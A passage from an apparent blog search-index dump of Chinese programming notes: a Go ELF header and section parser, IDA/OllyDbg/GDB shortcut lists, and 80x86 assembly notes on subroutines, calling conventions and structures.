microprocessor\", 58 : \"Motorola Star*Core processor\", 59 : \"Toyota ME16 processor\", 60 : \"STMicroelectronics ST100 processor\", 61 : \"Advanced Logic Corp. TinyJ embedded processor family\", 62 : \"AMD x86-64 architecture\", 63 : \"Sony DSP Processor\", 64 : \"Digital Equipment Corp. PDP-10\", 65 : \"Digital Equipment Corp. PDP-11\", 66 : \"Siemens FX66 microcontroller\", 67 : \"STMicroelectronics ST9+ 8/16 bit microcontroller\", 68 : \"STMicroelectronics ST7 8-bit microcontroller\", 69 : \"Motorola MC68HC16 Microcontroller\", 70 : \"Motorola MC68HC11 Microcontroller\", 71 : \"Motorola MC68HC08 Microcontroller\", 72 : \"Motorola MC68HC05 Microcontroller\", 73 : \"Silicon Graphics SVx\", 75 : \"Digital VAX\", 76 : \"Axis Communications 32-bit embedded processor\", 77 : \"Infineon Technologies 32-bit embedded processor\", 78 : \"Element 14 64-bit DSP Processor\", 79 : \"LSI Logic 16-bit DSP Processor\", 80 : \"Donald Knuth's educational 64-bit processor\", 81 : \"Harvard University machine-independent object files\", 82 : \"SiTera Prism\", 83 : \"Atmel AVR 8-bit microcontroller\", 84 : \"Fujitsu FR30\", 85 : \"Mitsubishi D10V\", 86 : \"Mitsubishi D30V\", 87 : \"NEC v850\", 88 : \"Mitsubishi M32R\", 89 : \"Matsushita MN10300\", 90 : \"Matsushita MN10200\", 91 : \"picoJava\", 92 : \"OpenRISC 32-bit embedded processor\", 93 : \"ARC Cores Tangent-A5\", 94 : \"Tensilica Xtensa Architecture\", 95 : \"Alphamosaic VideoCore processor\", 96 : \"Thompson Multimedia General Purpose Processor\", 97 : \"National Semiconductor 32000 series\", 98 : \"Tenor Network TPC processor\", 99 : \"Trebia SNP 1000 processor\", 100 : \"STMicroelectronics (www.st.com) ST200 microcontroller\", 101 : \"Ubicom IP2xxx microcontroller family\", 102 : \"MAX Processor\", 103 : \"National Semiconductor CompactRISC microprocessor\", 104 : \"Fujitsu F2MC16\", 105 : \"Texas Instruments embedded microcontroller msp430\", 106 : \"Analog Devices Blackfin (DSP) processor\", 107 : \"S1C33 Family of Seiko Epson processors\", 108 : \"Sharp embedded microprocessor\", 109 : \"Arca RISC Microprocessor\", 110 : \"Microprocessor series from PKU-Unity Ltd. and MPRC of Peking University\", &#125; e_version目标文件版本。固定值01 EV_CURRENT e_entry程序入口的虚拟地址 e_phoffProgram Header Table的偏移地址，即程序头部表索引地址 e_shoffSection Header Table的偏移地址，即节区表索引地址 e_flags处理器相关标识 e_ehsizeELF Header的大小 e_phentsizeProgram Header Entry的大小，即程序头部表的单个表项的大小 e_phnumProgram Header Entry的数目，即程序头部表的表项数 e_shentsizeSection Header Entry的大小，即节区表的单个表项的大小 e_shnumSection Header Entry的数目，即节区表的表项数 e_shstrndx即节区名称表(.shstrtab)位于节区表的位置，用于索引节区的名字 读取ELF Header例子例如有一个ELF Header的二进制数据为 12347E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 0002 00 03 00 01 00 00 00 10 83 04 08 34 00 00 00E0 17 00 00 00 00 00 00 34 00 20 00 09 00 28 001F 00 1C 00 那么e_ident即为 17E 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00 名称 值 含义 Ehdr_Class 01 ELF32 Ehdr_Data 01 2’s complement, little endian Ehdr_Version 01 1 (current) Ehdr_OS 00 UNIX - System V Ehdr_ABIV 00 0x0 e_type的二进制数据即为02 00因为是小端存储应该变为0002也就是2，所以也就是Executable 以此类推即可 代码这里需要注意因为如果是小端序存储的话，需要转变为大端序才是一般常用的显示格式，所以我引入了LSBtoMSB函数，一些更具体的代码可以查看项目 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556func (Ehdr Elf32_Ehdr) ReadHeader(data []byte) Elf32_Ehdr&#123; Ehdr = Ehdr.ReadMagic(data) //e_type tmp := data[16:18] tmp = Change.LSBtoMSB(tmp) Ehdr.e_type = Elf32_Half(Change.BytesToInt16(tmp)) //e_machine tmp = data[18:20] tmp = Change.LSBtoMSB(tmp) Ehdr.e_machine = Elf32_Half(Change.BytesToInt16(tmp)) //e_version tmp = data[20:24] tmp = Change.LSBtoMSB(tmp) Ehdr.e_version = Elf32_Word(1) //e_entry tmp = data[24:28] tmp = Change.LSBtoMSB(tmp) Ehdr.e_entry = Elf32_Addr(Change.BytesToInt32(tmp)) //e_phoff tmp = data[28:32] tmp = Change.LSBtoMSB(tmp) Ehdr.e_phoff = Elf32_Off(Change.BytesToInt32(tmp)) //e_shoff tmp = data[32:36] tmp = Change.LSBtoMSB(tmp) Ehdr.e_shoff = Elf32_Off(Change.BytesToInt32(tmp)) //e_flags tmp = data[36:40] tmp = Change.LSBtoMSB(tmp) Ehdr.e_flags = Elf32_Word(Change.BytesToInt32(tmp)) //e_ehsize tmp = data[40:42] tmp = Change.LSBtoMSB(tmp) Ehdr.e_ehsize = Elf32_Half(Change.BytesToInt16(tmp)) //e_phentsize tmp = data[42:44] tmp = Change.LSBtoMSB(tmp) Ehdr.e_phentsize = Elf32_Half(Change.BytesToInt16(tmp)) //e_phnum tmp = data[44:46] tmp = Change.LSBtoMSB(tmp) Ehdr.e_phnum = Elf32_Half(Change.BytesToInt16(tmp)) //e_shentsize tmp = data[46:48] tmp = Change.LSBtoMSB(tmp) Ehdr.e_shentsize = Elf32_Half(Change.BytesToInt16(tmp)) //e_shnum tmp = data[48:50] tmp = Change.LSBtoMSB(tmp) Ehdr.e_shnum = Elf32_Half(Change.BytesToInt16(tmp)) //e_shstrndx tmp = data[50:52] tmp = Change.LSBtoMSB(tmp) Ehdr.e_shstrndx = Elf32_Half(Change.BytesToInt16(tmp)) return Ehdr&#125; 输出ELF Header1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889func (Ehdr Elf32_Ehdr) PHeader()&#123; fmt.Println(\"ELF Header:\") fmt.Printf(\"%-9s\",\"Magic: \") fmt.Println(Ehdr.Ehdr_Magic) //Class fmt.Printf(\"%-35s\",\"Class: \") tmpstr := EhdrClass[Ehdr.Ehdr_Class] if tmpstr == \"\"&#123; fmt.Println(\"Invalid class\") &#125;else&#123; fmt.Println(tmpstr) &#125; //Data fmt.Printf(\"%-35s\",\"Data: \") tmpstr = EhdrData[Ehdr.Ehdr_Data] if tmpstr == \"\"&#123; fmt.Println(\"Invaild data encoding\") &#125;else &#123; fmt.Println(tmpstr) &#125; //Version fmt.Printf(\"%-35s\",\"Version: \") tmpstr = EhdrVersion[Ehdr.Ehdr_Version] if tmpstr == \"\"&#123; fmt.Println(\"Invaild version\") &#125; else&#123; fmt.Println(tmpstr) &#125; //OS/ABI fmt.Printf(\"%-35s\",\"OS/ABI: \") tmpstr = EhdrOSABI[Ehdr.Ehdr_OS] if tmpstr == \"\"&#123; fmt.Println(\"Unknown\") &#125; else&#123; fmt.Println(tmpstr) &#125; //ABI Version fmt.Printf(\"%-35s\",\"ABI Version:\") fmt.Println(int64(Ehdr.Ehdr_ABIV)) //Type fmt.Printf(\"%-35s\",\"Type: \") tmpstr = EhdrType[int(int32(Ehdr.e_type))] if tmpstr == \"\"&#123; fmt.Println(\"Unknown\" ) &#125;else &#123; fmt.Println(tmpstr ) &#125; //Machine fmt.Printf(\"%-35s\",\"Machine: \") tmpstr = EhdrMachine[int(int32(Ehdr.e_machine))] if tmpstr == \"\"&#123; fmt.Println(\"Unknown\" ) &#125;else &#123; fmt.Println(tmpstr) &#125; //Version fmt.Printf(\"%-35s\",\"Version:\") fmt.Println(\"0x\"+Change.DecHex(int64(Ehdr.e_version))) //Entry point address fmt.Printf(\"%-35s\",\"Entry point address:\") fmt.Println(\"0x\"+Change.DecHex(int64(Ehdr.e_entry))) //Start of program headers fmt.Printf(\"%-35s\",\"Start of program headers:\") fmt.Println(int64(Ehdr.e_phoff),\"(bytes into file)\") //Start of section headers fmt.Printf(\"%-35s\",\"Start of section headers:\") fmt.Println(int64(Ehdr.e_shoff),\"(bytes into file)\") //Flags fmt.Printf(\"%-35s\",\"FLags:\") fmt.Println(\"0x\"+Change.DecHex(int64(Ehdr.e_flags))) //Size of this header fmt.Printf(\"%-35s\",\"Size of this header:\") fmt.Println(int64(Ehdr.e_ehsize),\"(bytes)\") //Size of program headers fmt.Printf(\"%-35s\",\"Size of program headers:\") fmt.Println(int64(Ehdr.e_phentsize),\"(bytes)\") //Number of program headers fmt.Printf(\"%-35s\",\"Number of program headers:\") fmt.Println(int64(Ehdr.e_phnum)) //Size of section headers fmt.Printf(\"%-35s\",\"Size of section headers:\") fmt.Println(int64(Ehdr.e_shentsize),\"(bytes)\") //Number of section headers fmt.Printf(\"%-35s\",\"Number of section headers:\") fmt.Println(int64(Ehdr.e_shnum)) //Section header string table index fmt.Printf(\"%-35s\",\"Section header string table index:\") fmt.Println(int64(Ehdr.e_shstrndx))&#125; Program Header Table概述首先我们得先熟悉并且理解Program Header Table的结构体定义开始： 12345678910111213141516171819type Elf32_phdr struct &#123; p_type Elf32_Word //此数组元素描述的段的类型，或者如何解释此数组元素的信息 p_offset Elf32_Off //此成员给出从文件头到该段第一个字节的偏移 p_vaddr Elf32_Addr //此成员给出段的第一个字节将被放到内存中的虚拟地址 p_paddr Elf32_Addr //此成员仅用于与物理地址相关的系统中。System V忽略所有应用程序的物理地址信息 p_filesz Elf32_Word //此成员给出段在文件映像中所占的字节数。可以为0 p_memsz Elf32_Word //此成员给出段在内存映像中占用的字节数。可以为0 p_flage Elf32_Word //此成员给出与段相关的标志(read、write、exec) p_align Elf32_Word //此成员给出段在文件中和内存中如何对齐 //字节对其,p_vaddr 和 p_offset 对 p_align 取模后应该等于0&#125; 下面开始逐步解释各个字段 p_type声明此段的作用类型 12345678910111213141516171819202122232425262728PType := map[int]string&#123; 0x0:\"NULL\", 0x1:\"LOAD\", 0x2:\"DYNAMIC\", 0x3:\"INERP\", 0x4:\"NOTE\", 0x5:\"SHLIB\", 0x6:\"PHDR\", 0x7:\"TLS\", 0x8:\"NUM\", 0x60000000:\"LOOS\", 0x6474e550:\"GNU_EH_FRAME\", 0x6474e551:\"GNU_STACK\", 0x6474e552:\"GNU_RELRO\", 0x6ffffffa:\"LOSUNW\", 0x6ffffffc:\"SUNWBSS\", 0x6ffffffb:\"SUNWSTACK\", 0x6fffffff:\"HISUNW \", 0x6ffffffe:\"HIOS\", 0x70000000:\"LOPROC\", 0x7fffffff:\"HIPROC\", // ARM Sections 0x70000001:\"ARM_EXIDX\", 0x70000002:\"ARM_PREEMPTMAP\", 0x70000003:\"ARM_ATTRIBUTES\", 0x70000004:\"ARM_DEBUGOVERLAY\", 0x70000005:\"ARM_OVERLAYSECTION\", &#125; p_offset段相对于文件的索引地址 p_vaddr段在内存中的虚拟地址 p_paddr段的物理地址 p_filesz段在文件中所占的长度 p_memsz段在内存中所占的长度 p_flage段相关标志(read、write、exec) 12345678910PFlag := map[int]string&#123; 0:\"N\", 1:\"__E\", 2:\"_W_\", 3:\"_WE\", 4:\"R__\", 5:\"R_E\", 6:\"RW_\", 7:\"RWE\", &#125; p_align给出段在文件中和内存中如何对齐 读取Program Header Table这里的一个关键是如果从文件中读取出Program Header Table的数据，在ELF_Header中,我们可以得到Program Header的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize) 那我们可以知道Program Header Table的数据起始地址Star_Addr，结束地址End_Addr： Star_Addr = e_phoff End_Addr = e_phoff + e_phnum*e_phentsize 获取到数据后，就需要一个个去读取每一个Program Header 转变为代码即为： 123456789func (phdr Elf32_phdr) MainRead(Ehdr Elf32_Ehdr,data []byte)&#123; var Phnum int64 = int64(Ehdr.e_phnum) //获取Program Header数量 var StartIndex int64= int64(Ehdr.e_phoff) for i:=0;i&lt;int(Phnum);i++ &#123; phdr.SonRead(StartIndex,data,int64(Ehdr.e_phentsize)) StartIndex = StartIndex + int64(Ehdr.e_phentsize) &#125; fmt.Println(\"\")&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970func (phdr Elf32_phdr) SonRead(StartIndex int64,data []byte,size int64)&#123; var t_phdr Elf32_phdr var t_data []byte = data[StartIndex:StartIndex+size] //p_type Elf32_Word tmp := t_data[:4] tmp = Change.LSBtoMSB(tmp) t_phdr.p_type = Elf32_Word(Change.BytesToInt32(tmp)) //p_offset Elf32_Off tmp = t_data[4:8] tmp = Change.LSBtoMSB(tmp) t_phdr.p_offset = Elf32_Off(Change.BytesToInt32(tmp)) //p_vaddr Elf32_Addr tmp = t_data[8:12] tmp = Change.LSBtoMSB(tmp) t_phdr.p_vaddr = Elf32_Addr(Change.BytesToInt32(tmp)) //p_paddr Elf32_Addr tmp = t_data[12:16] tmp = Change.LSBtoMSB(tmp) t_phdr.p_paddr = Elf32_Addr(Change.BytesToInt32(tmp)) //p_filesz Elf32_Word tmp = t_data[16:20] tmp = Change.LSBtoMSB(tmp) t_phdr.p_filesz = Elf32_Word(Change.BytesToInt32(tmp)) //p_memsz Elf32_Word tmp = t_data[20:24] tmp = Change.LSBtoMSB(tmp) t_phdr.p_memsz = Elf32_Word(Change.BytesToInt32(tmp)) //p_flage Elf32_Word tmp = t_data[24:28] tmp = Change.LSBtoMSB(tmp) t_phdr.p_flage = Elf32_Word(Change.BytesToInt32(tmp)) //p_align Elf32_Word tmp = t_data[28:32] tmp = Change.LSBtoMSB(tmp) t_phdr.p_align = Elf32_Word(Change.BytesToInt32(tmp)) //p_type tmpstr := PType[int(int32(t_phdr.p_type))] if tmpstr ==\"\"&#123; fmt.Printf(\"%-13s\",\"Unknown\") &#125;else&#123; fmt.Printf(\"%-13s\",tmpstr) &#125; //p_offset fmt.Print(\" \") tstr := \"0x\"+Change.DecHex(int64(t_phdr.p_offset)) fmt.Printf(\"%-9s\",tstr) //p_vaddr tstr = \"0x\"+Change.DecHex(int64(t_phdr.p_vaddr)) fmt.Printf(\"%-11s\",tstr) //p_paddr tstr = \"0x\"+Change.DecHex(int64(t_phdr.p_paddr)) fmt.Printf(\"%-11s\",tstr) //p_filesz tstr = \"0x\"+Change.DecHex(int64(t_phdr.p_filesz)) fmt.Printf(\"%-8s\",tstr) //p_memsz tstr = \"0x\"+Change.DecHex(int64(t_phdr.p_memsz)) fmt.Printf(\"%-8s\",tstr) //p_flage //R:Read W:Write E:Exec N:None tmpstr = PFlag[int(int32(t_phdr.p_flage))] if tmpstr ==\"\"&#123; fmt.Printf(\"%-13s\",\"Unknown\") &#125;else&#123; fmt.Printf(\"%-4s\",tmpstr) &#125; //p_align tstr = \"0x\"+Change.DecHex(int64(t_phdr.p_align)) fmt.Printf(\"%-8s\\n\",tstr)&#125; 负责打印一开始的部分 1234567891011121314151617181920212223242526func (phdr Elf32_phdr) PHeader(Ehdr Elf32_Ehdr)&#123; EhdrType := map[int]string&#123; 0x0 : \"NONE\",//No file type 0x1 : \"REL\",//Relocatable 0x2 : \"EXEC\",//Executable 0x3 : \"DYN\",//Shared object 0x4 : \"CORE\",//Core 0xfe00 : \"LOOS\",//OS specific 0xfeff : \"HIOS\",//OS specific 0xff00 : \"LOPROC\",//Processor specific 0xffff : \"HIPROC\",//Processor specific &#125; var T_type string tmpstr := EhdrType[int(int32(Ehdr.e_type))] if tmpstr == \"\"&#123; T_type = \"Unknown\" &#125;else &#123; T_type =tmpstr &#125; fmt.Println(\"Elf file type is \"+T_type) fmt.Println(\"Entry point 0x\"+Change.DecHex(int64(Ehdr.e_entry))) fmt.Print(\"There are \",Ehdr.e_phnum,\" program headers, \") fmt.Println(\"starting at offset\",Ehdr.e_phoff) fmt.Println(\"Program Headers:\") fmt.Println(\"Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align\")&#125; Section Header Table概述首先我们得先熟悉并且理解Section Header Table的结构体定义开始： 12345678910111213141516171819202122type Elf32_Shdr struct &#123; sh_name Elf32_Word //节区名称,此处是一个在名称节区的索引 sh_type Elf32_Word //节区类型 sh_flags Elf32_Word //同Program Header的p_flags sh_addr Elf32_Addr //节区索引地址 sh_offset Elf32_Off //节区相对于文件的偏移地址 sh_size Elf32_Word //节区的大小 sh_link Elf32_Word //此成员给出节区头部表索引链接 sh_info Elf32_Word //此成员给出附加信息 sh_addralign Elf32_Word //某些节区带有地址对齐约束 sh_entsize Elf32_Word //某些节区中包含固定大小的项目,如符号表&#125; 下面开始逐步解释各个字段 sh_name节区名称,此处是一个在名称节区的索引 sh_type节区类型 1234567891011121314151617181920212223242526272829303132333435ShType := map[int]string&#123; 0x0:\"NULL\",/* Inactive section header */ 0x1:\"PROGBITS\",/* Information defined by the program */ 0x2:\"SYMTAB\",/* Symbol table - not DLL */ 0x3:\"STRTAB\",/* String table */ 0x4:\"RELA\",/* Explicit addend relocations, Elf64_Rela */ 0x5:\"HASH\",/* Symbol hash table */ 0x6:\"DYNAMIC\",/* Information for dynamic linking */ 0x7:\"NOTE\",/* A Note section */ 0x8:\"NOBITS\",/* Like SHT_PROGBITS with no data */ 0x9:\"REL\",/* Implicit addend relocations, Elf64_Rel */ 0xA:\"SHLIB\",/* Currently unspecified semantics */ 0xD:\"DYNSYM\",/* Symbol table for a DLL */ 0xE:\"INIT_ARRAY\",/* Array of constructors */ 0xF:\"FINI_ARRAY\",/* Array of deconstructors */ 0x10:\"PREINIT_ARRAY\",/* Array of pre-constructors */ 0x11:\"GROUP\",/* Section group */ 0x12:\"SYMTAB_SHNDX\",/* Extended section indeces */ 0x13:\"NUM\",/* Number of defined types */ 0x60000000:\"LOOS\",/* Lowest OS-specific section type */ 0x6ffffff5:\"GNU_ATTRIBUTES\",/* Object attribuytes */ 0x6ffffff6:\"GNU_HASH\",/* GNU-style hash table */ 0x6ffffff7:\"GNU_LIBLIST\",/* Prelink library list */ 0x6ffffff8:\"CHECKSUM\",/* Checksum for DSO content */ 0x6ffffffa:\"LOSUNW\",/* Sun-specific low bound */ 0x6ffffffb:\"SUNW_COMDAT\", 0x6ffffffc:\"SUNW_syminfo\", 0x6ffffffd:\"GNU_verdef\",/* Version definition section */ 0x6ffffffe:\"GNU_verdneed\",/* Version needs section */ 0x6fffffff:\"GNY_versym\",/* Version symbol table */ 0x70000000:\"LOPROC\",/* Start of processor-specific section type */ 0x7fffffff:\"HIPROC\",/* End of processor-specific section type */ 0x80000000:\"LOUSER\",/* Start of application-specific */ 0x8fffffff:\"HIUSER\",/* Ennd of application-specific */ &#125; sh_flags同Program Header的p_flags 1234567891011ShFlag := map[int]string&#123; 0x0:\"\", 0x1:\"W\", 0x2:\"A\", 0x3:\"WA\", 0x4:\"\", 0x5:\"\", 0x6:\"AX\", 0x30:\"MS\", 0x42:\"AI\", &#125; sh_addr节区索引地址 sh_offset节区相对于文件的偏移地址 sh_size节区的大小 sh_link此成员给出节区头部表索引链接 sh_info此成员给出附加信息 sh_addralign某些节区带有地址对齐约束 sh_entsize某些节区中包含固定大小的项目,如符号表 读取Section Header Table这里有一个关键点，就是sh_name不是直接的保存的字符数据，而是相对于节区名称表(.shstrtab)的起始地址偏差，所以说得先提取出节区名称表(.shstrtab)的数据才能得到每个节区的名称，来源就是直接ELF Header里的e_shstrndx成员 12345678910111213141516171819202122func (Shdr Elf32_Shdr) Findshstrtab(Ehdr Elf32_Ehdr,data []byte)[]byte&#123; //var num int64 = int64(Ehdr.e_shnum)//获取到名称表总数 //先找到.shstrtab段的数据拿到节区名称表 var strtab = int64(Ehdr.e_shstrndx) shsize := int64(Ehdr.e_shentsize) var t_Index int64= int64(Ehdr.e_shoff) TabStIndex := t_Index + strtab*shsize t_data := data[int(TabStIndex):int(TabStIndex+shsize)] //fmt.Println(t_data) //获取节区大小 t_size := t_data[20:24] t_size = Change.LSBtoMSB(t_size) size := Change.BytesToInt32(t_size) //fmt.Println(int64(size)) //获取数据偏移地址 t_offset := t_data[16:20] t_offset = Change.LSBtoMSB(t_offset) offset := Change.BytesToInt32(t_offset) //fmt.Println(Change.DecHex(int64(offset))) t_data = data[int(offset):int(offset+size)] return t_data&#125; 1234567891011func (Shdr Elf32_Shdr) FindName(index int32,data []byte)string&#123; var t_str string for&#123; t_str += string(data[index]) index++ if(data[index] == 0)&#123; break &#125; &#125; return t_str&#125; 解决之后只要接下来按部就班读取就好了 12345678910111213func (Shdr Elf32_Shdr) Mainread(Ehdr Elf32_Ehdr,data []byte)&#123; var Shnum int64 = int64(Ehdr.e_shnum) //获取Section Header Table数量 var StartIndex int64= int64(Ehdr.e_shoff) for i:=0;i&lt;int(Shnum);i++ &#123; Shdr.SonRead(i,StartIndex,data,int64(Ehdr.e_shentsize),Ehdr) fmt.Println() StartIndex = StartIndex + int64(Ehdr.e_shentsize) &#125; fmt.Println(\"Key to Flags:\") fmt.Println(\" W (write), A (alloc), X (execute), M (merge), S (strings)\") fmt.Println(\" I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\") fmt.Println(\" O (extra OS processing required) o (OS specific), p (processor specific)\")&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091func (Shdr Elf32_Shdr) SonRead(i int,StartIndex int64,data []byte,size int64,Ehdr Elf32_Ehdr)&#123; var t_data []byte = data[StartIndex:StartIndex+size] var t_shdr Elf32_Shdr //sh_name Elf32_Word tmp := t_data[:4] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_name = Elf32_Word(Change.BytesToInt32(tmp)) //sh_type Elf32_Word tmp = t_data[4:8] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_type = Elf32_Word(Change.BytesToInt32(tmp)) //sh_flags Elf32_Word tmp = t_data[8:12] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_flags = Elf32_Word(Change.BytesToInt32(tmp)) //sh_addr Elf32_Addr tmp = t_data[12:16] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_addr = Elf32_Addr(Change.BytesToInt32(tmp)) //sh_offset Elf32_Off tmp = t_data[16:20] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_offset = Elf32_Off(Change.BytesToInt32(tmp)) //sh_size Elf32_Word tmp = t_data[20:24] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_size = Elf32_Word(Change.BytesToInt32(tmp)) //sh_link Elf32_Word tmp = t_data[24:28] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_link = Elf32_Word(Change.BytesToInt32(tmp)) //sh_info Elf32_Word tmp = t_data[28:32] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_info = Elf32_Word(Change.BytesToInt32(tmp)) //sh_addralign Elf32_Word tmp = t_data[32:36] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_addralign = Elf32_Word(Change.BytesToInt32(tmp)) //sh_entsize Elf32_Word tmp = t_data[36:40] tmp = Change.LSBtoMSB(tmp) t_shdr.sh_entsize = Elf32_Word(Change.BytesToInt32(tmp)) //fmt.Println(t_shdr) //[Nr] fmt.Print(\"[\") fmt.Printf(\"%2v\",i) fmt.Print(\"] \") //Name if t_shdr.sh_name == 0&#123; t_Str := \"0\" fmt.Printf(\"%-18s\",t_Str) &#125;else &#123; ShName := Shdr.Findshstrtab(Ehdr,data) t_Str := Shdr.FindName(int32(t_shdr.sh_name),ShName) fmt.Printf(\"%-18s\",t_Str) &#125; //Type tmpstr := ShType[int(int32(t_shdr.sh_type))] if tmpstr ==\"\"&#123; fmt.Printf(\"%-16s\",\"Unknown\") &#125;else&#123; fmt.Printf(\"%-16s\",tmpstr) &#125; //Addr tmpstr = Change.DecHex(int64(t_shdr.sh_addr)) fmt.Printf(\"%-9s\",tmpstr) //Off tmpstr = Change.DecHex(int64(t_shdr.sh_offset)) fmt.Printf(\"%-7s\",tmpstr) //Size tmpstr = Change.DecHex(int64(t_shdr.sh_size)) fmt.Printf(\"%-7s\",tmpstr) //ES tmpstr = Change.DecHex(int64(t_shdr.sh_entsize)) fmt.Printf(\"%-3s\",tmpstr) //Flg tmpstr = ShFlag[int(int32(t_shdr.sh_flags))] fmt.Printf(\"%3s\",tmpstr) //Lk tmpstr = Change.DecHex(int64(t_shdr.sh_link)) fmt.Printf(\"%3s\",tmpstr) //Inf tmpstr = Change.DecHex(int64(t_shdr.sh_info)) fmt.Print(\" \") fmt.Printf(\"%3s\",tmpstr) //Al tmpstr = Change.DecHex(int64(t_shdr.sh_addralign)) fmt.Print(\" \") fmt.Printf(\"%2s\",tmpstr)&#125; 负责打印一开始的部分 12345678910func (Shdr Elf32_Shdr) PHeader(Ehdr Elf32_Ehdr)&#123; fmt.Println(\"There are\",Ehdr.e_shnum, \"section headers, starting at offset\", \"0x\"+ Change.DecHex(int64(Ehdr.e_shoff))+\":\", ) fmt.Println() fmt.Println(\"Section Headers:\") fmt.Println(\"[Nr] Name Type Addr Off Size ES Flg Lk Inf Al\")&#125;","categories":[],"tags":[]},{"title":"IDA、GDB、DBG常用操作","slug":"IDAíóGDBíóDBG│ú╙├▓┘╫≈","date":"2020-03-17T15:21:18.000Z","updated":"2020-03-18T06:22:02.000Z","comments":true,"path":"2020/03/17/IDAíóGDBíóDBG│ú╙├▓┘╫≈/","link":"","permalink":"http://yoursite.com/2020/03/17/IDAíóGDBíóDBG│ú╙├▓┘╫≈/","excerpt":"","text":"IDA Pro F5：反编译代码 Space：切换汇编代码展示方式（流程图or顺序） tab：切换反编译窗口和汇编窗口 n：自定义变量函数名 y：自定义函数参数、调用方式 /：添加注释 x：交叉引用 shift + E：导出数据 Olly DBG F7：步进，跟进函数调用 F8：步过，不跟进函数调用 F9：运行直到断点 F4：执行到光标 F2：下断点 ctrl+g：跳转到指定地址 GDB 控制流操作 r：运行程序 r&lt;a.txt：重定向输入 si：步进 ni：步过 c：继续运行直到断点 finish：运行到函数结束 断点 b *0xaabb：在指定位置下断点 b main：在指定函数下断点 watch *0xaabb：当修改内存时中断 rwatch *0xaabb：在读取内存时中断 info b：查看当前断电 en 1：打开1号断点 dis 1：关闭1号断点 查看内存 x命令查看内存 x/16xb 0xaabb 查看0xaabb位置的内存，显示为16进制，单位为1字节 16代表往后数16份单位内存，x代表十进制，b代表byte x/32dw 0xaabb 查看0xaabb位置的内存，显示为10进制整数，单位为2字节 d代表十进制整数，word代表1个字两个字节 其他工具 Android\\JAVA JEB jadx xposed\\Frida MIPS JEB Ghidra","categories":[],"tags":[]},{"title":"80x86汇编笔记04","slug":"80x86╗π▒α▒╩╝╟04","date":"2020-03-04T01:58:29.000Z","updated":"2020-03-04T17:58:46.000Z","comments":true,"path":"2020/03/03/80x86╗π▒α▒╩╝╟04/","link":"","permalink":"http://yoursite.com/2020/03/03/80x86╗π▒α▒╩╝╟04/","excerpt":"","text":"子程序子程序的定义1234子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][参数：类型]...[VARARG] local 局部变量列表 指令子程序名 endp []是可选项 距离：可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以对距离的定义往往忽略 语言类型：表示参数的使用方式和堆栈平衡的方式，可以是StdCall、C、SysCall、BASIC、FORTRAN和PASCAL，如果忽略，则使用程序头部.model定义的值 可视区域：可以是PRIVATE、PUBLIC和EXPORT。默认的设置是PUBLIC PRIVATE：表示子程序只对本模块可见 PUBLIC：表示对所有的模块可见（在最后编译链接完成的exe文件中） EXPORT：表示是导出的函数，当编写DLL的时候要将某个函数导出的时候可以这样用 USES寄存器列表：表示由编译器在子程序指令开始前自动安排push这些寄存器的指令，并在ret前自动安排pop指令，用于保存执行环境 参数和类型：参数指定参数的名称，在定义参数名的时候不能跟全局变量和子程序中的局部变量重名。对于类型由于Win32中的参数类型只有32位一种类型，可以省略。在参数定义的最后还可以跟多个数量不确定的参数，在Win32汇编中唯一使用VARARG的API就是wsprintf 完成了定义之后，可以用invoke伪指令调用，为了让invoke指令能正常使用，必须在程序的头部用proto伪操作定义子程序的信息 如果先写子程序，再写主程序，就不需要invoke 参数传递和堆栈平衡在调用子程序时，参数的传递是通过堆栈进行的，也就说，调用者要传递给子程序的参数压入堆栈，子程序在堆栈中取出相应的值再使用 比如要调用：SubRouting(Var1,Var2,Var3)经过编译后的最终代码会是： 12345push Var3push Var2push Var1call SubRoutingadd esp,12 不同的调用规范 语言 最先入栈参数 清除堆栈者 允许使用VARARG C 右 调用者 是 SysCall 右 子程序 是 StdCall 右 子程序 是 BASIC 左 子程序 否 FORTRAN 左 子程序 否 PASCAL 左 子程序 否 特殊的是StdCall的对战清楚平时是由子程序完成的，但使用VARARG时是由调用者清除的 数据结构数据结构实际上是由多个字段组成的数据样板，相当于一种自定义的数据类型，数据结构中间的每一个字段可以是字节、字、双字、字符串或所有可能的数据类型 比如在API函数RegisterClass中要使用到一个叫做WNDCLASS的数据结构： 123456789101112typeof struct_WNDCLASS&#123; UINT style; WNDPROC lpfnWndProc; Int cbClsExtra; Int cbWndExtra; HINSTANCE hInstance; HICON hIcon; HCURSOR hCursor; HBRUSH hbrBackground; LPCTSTR lpszMenuName; LPCTSTR lpszClassName;&#125;WNDCLASS.*PWNDCLASS 这是C语言格式的，在汇编中是这样的： 123456789101112WNDCLASS struct Style DWORD ? lpfnWndProc DWORD ? cbClsExtra DWORD ? cbWndExtra DWORD ? hInstance DWORD ? hIcon DWORD ? hCursor DWORD ? hbrBackground DWORD ? lpszMenuName DWORD ? lpszClassName DWORD ?WNDCLASS ends 和大部分的常量一样，几乎所有API所涉及的数据结构在Windows.inc文件中都已经定义了 定义了数据结构实际上只是定义了一个样板，上面的定义语句并不会在哪个段中产生数据。只是以一个模板的形式存在，今后通过这个样板声明定义结构变量才占用空间 使用数据结构在数据段中定义数据的方法如下： 12345.data?stWndClass WNDCLASS &lt;&gt;....datastWndClass WNDCLASS &lt;1,1,1,1,1,1,1,1,1,1&gt; 第一段的定义方法是未初始化的定义方法 